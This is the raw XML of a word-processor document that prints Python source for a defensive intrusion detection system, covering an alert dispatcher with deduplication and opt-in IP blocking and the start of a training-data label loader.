    <w:p w14:paraId="53014473" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="72ABD4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__init__(self, config, reporter=None, alert_queue=None, logger=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4500717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remote=None, defense=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D0D10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self.config = config</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="393878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self.reporter = reporter</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4678739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self.alert_queue = alert_queue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15F7E73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self.logger = logger</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="626DDD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self.remote = remote</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BDD441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self.defense = defense</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="628AA3FC" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7BC1F52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self.total = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AE5D31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self.by_kind = {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DE127E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self.blocked = set()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01C4820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self._recent_alerts = {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ABC96A9" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5FECCEF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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ACD27C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dispatch(self, message, kind=None, src_ip=None, confidence=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B7C112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payload=None, engine=None, response_status=False):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71A9E0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"""Publish one alert to every configured sink.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D26B7F2" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="716B7C4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`kind` may be supplied by the caller (the engine already knows what it</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="438BA6E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detected); otherwise it is inferred from the message text.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F8FCB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A6FB21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meta = mitre.enrich(message, confidence)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A0ECED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kind:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45216BA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meta["kind"] = kind</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E2B3724" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4AEF1B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Packet retransmissions and request/response fragments can carry the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51F612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same signature more than once. Publish one event per source/message</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="684158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within a short window instead of inflating every downstream count.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DDDD24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now = time.monotonic()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31D80EA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dedup_seconds = max(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48B642D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0.0, float(getattr(self.config, "alert_dedup_seconds", 5.0)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="132EA10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dedup_key = (meta["kind"], src_ip or "", message)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EE42D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previous = self._recent_alerts.get(dedup_key)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12A455E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(dedup_seconds &gt; 0 and previous is not None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="458076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and now - previous &lt; dedup_seconds):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C40A97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meta["suppressed_duplicate"] = True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07B19C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meta</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43C756F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self._recent_alerts[dedup_key] = now</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="515F7B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len(self._recent_alerts) &gt; 2048:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="571575D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cutoff = now - max(dedup_seconds, 1.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D55DF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self._recent_alerts = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="127CF4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key: seen for key, seen in self._recent_alerts.items()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EBE6A2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seen &gt;= cutoff</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49FB95C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3AE39A1" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5DE5A7C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self.total += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E61A8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self.by_kind[meta["kind"]] = self.by_kind.get(meta["kind"], 0) + 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="138072DF" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="41C3A3C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Decide the response before publishing so an optional status label is</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="096E46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truthful. "Blocked" is shown only after the firewall confirms that a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6680903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rule was inserted; otherwise the observation is merely "Flagged".</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D2997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blocked = self.maybe_block(src_ip, meta["kind"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FB3420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meta["blocked"] = blocked</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AFA3E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response_status:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D46049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message = "%s (%s)" % (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="022C1C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message, "Blocked" if blocked else "Flagged")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="714B8BB0" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7A3AD61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1. forensic HTML report</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E3380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self.reporter is not None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58D49F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6FFC14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self.reporter.add_alert(message)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34BD13C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Exception as e:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54ACC7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report error:", e)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03717680" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="32DBB80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2. CSV audit trail (applies the privacy policy internally)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="322FF93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self.logger is not None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="757801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self.logger.log_alert(message, src_ip=src_ip,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17E815F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engine=engine or meta["engine"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DA072D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confidence=confidence, payload=payload,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F62531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verdict=meta["kind"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A1B2B12" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4F50197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3. structured JSON telemetry to the SIEM</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EEDF8D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self.remote is not None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A6F5D2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self.remote.send_log(message, src_ip=src_ip,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D55FC0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engine=engine or meta["engine"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26B2AEB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confidence=confidence, payload=payload)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FE4E32B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7AEBAFC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4. attached UI (CLI dashboard or web bridge)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EC43AB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self.alert_queue is not None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="090E5A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self.alert_queue.put(message)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06BF154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else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BA07A0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print("\n[!!!] " + message)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0676E0C0" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1998D6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meta</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17765BE2" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="32AFB0E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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1922C33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maybe_block(self, src_ip, kind):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65A9113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"""Apply the opt-in blocking policy for one source address.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22074AB2" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0CC959F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Three independent conditions must all hold before a rule is inserted,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="238D47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which is what makes the behaviour defensible under NFR-3:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E01985E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1E3F46C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blocking is explicitly enabled in configuration;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C8B519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this detection kind is in the permitted block_on list;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07C57C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the address is not whitelisted (loopback and the local host are</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E3F42C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whitelisted by default, so MANTIS can never firewall itself off).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BF2E40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023B34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src_ip or self.defense is None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04A225A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False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B8B569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getattr(self.config, "block_enabled", False):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B86311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False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3616A6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allowed = getattr(self.config, "block_on", [])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DFEB0E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accept either the specific kind ("sqli") or its policy group</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ED65C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("payload"), so a policy need not enumerate every sub-family</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10B7A7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kind not in allowed and mitre.parent_kind(kind) not in allowed:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70B4A8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False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DAEE9D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src_ip in getattr(self.config, "block_whitelist", []):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A4DC17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%s is whitelisted - not blocking" % src_ip)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3402A1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False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63F9C39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src_ip in self.blocked:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FD0BAB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False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0597CFEE" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2C10A20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self.defense.block_ip(src_ip):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15247B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self.blocked.add(src_ip)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="339DD86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True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4982FE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False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="416B02C4" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4155F9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summary(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A5F52E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{"alerts": self.total, "by_kind": dict(self.by_kind),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55FC23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"blocked_ips": sorted(self.blocked)}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44ED1544" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5655B641" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="313DD2A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__name__ == "__main__":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BC802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from utils.config import Config</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="330FFA50" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="070295F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class _FakeDefense:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="093F385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block_ip(self, ip):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59600E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[iptables] DROP %s" % ip)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5528BCD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True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16E04BEF" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="35CDD78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cfg = Config()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34D24FB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 = AlertDispatcher(cfg, defense=_FakeDefense())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03496BD0" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="32B9CAD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blocking disabled (default, NFR-3) --")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CA7E1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d.dispatch("DDoS DETECTED! Z-Score: 4.2 (PPS: 9000)", src_ip="10.0.0.5",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F76F70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confidence=0.9)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41EFCCC4" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="278F53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print("\n-- blocking enabled --")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4084DB4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cfg.block_enabled = True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43DC2BB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d.dispatch("MALICIOUS PAYLOAD! Keywords: ['UNION']", src_ip="10.0.0.7",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="708538C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confidence=0.99)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41DF564C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2FFE8A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print("\n-- whitelisted source --")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="530623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d.dispatch("PORT SCAN DETECTED! (Unique Ports: 90/sec)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D7D73B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src_ip="127.0.0.1", confidence=0.8)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40CDE497" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="35C740E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print("\n", d.summary())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3811EC22" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="229CA4C0" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Training and Evaluation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E692FC4"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src/training/loader.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="545A601F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>150 lines</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A2671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csv</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FCD1B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json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A94B00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os</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="553297C5" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="10F5517D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2E43D1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NORMAL = {"normal", "benign", "0", "background", "safe"}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ACD96D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SCAN = {"scan", "portscan", "port_scan", "recon", "reconnaissance"}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C211E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ATTACK = {"ddos", "dos", "flood", "synflood", "udpflood",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D8BF34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"attack", "malicious", "1", "anomaly"}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CFFE678" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="60396BF9" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="15F01C4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DatasetError(Exception):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3778B99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pass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D739BE3" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="47300D62" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="197E52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normalise_label(raw):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E207FB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raw is None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FCF97B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"Normal"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39FD4A3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 = str(raw).strip().lower()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4513D81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compact = k.replace("-", "").replace("_", "").replace(" ", "")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="255513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k in NORMAL:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BC9359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"Normal"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0118AC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(k in SCAN or "portscan" in compact</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AA2813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or compact.startswith("recon")):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3744CD3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"Scan"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="658183F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k in {"malicious", "sqli", "xss", "lfi", "rce", "payload"}:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34B0A0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"Malicious"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76FAEB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k in ATTACK:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="132C2FF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"Attack"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="213998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raw.strip().capitalize() or "Normal"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3998C106" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3431C498" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="744FC4A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_open(path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3337EE7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os.path.isfile(path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03C352A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raise DatasetError("file not found: " + path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7747605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open(path, "r", newline="", encoding="utf-8", errors="ignore")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08487507" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
